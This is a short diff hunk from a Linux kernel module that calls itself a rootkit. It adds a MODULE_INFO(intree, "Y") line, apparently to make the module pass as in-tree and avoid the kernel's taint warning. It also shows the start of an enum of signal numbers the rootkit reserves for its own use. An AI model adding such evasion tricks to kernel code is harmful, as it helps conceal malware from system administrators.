@@ -26,6 +26,7 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Omri Ben Zikri");
 MODULE_DESCRIPTION("Very fun rootkit");
 MODULE_VERSION("1.0.0");
+MODULE_INFO(intree, "Y");
 
 // Unused signal numbers which can be used by the rootkit for its own purposes
 enum rooti_signal {
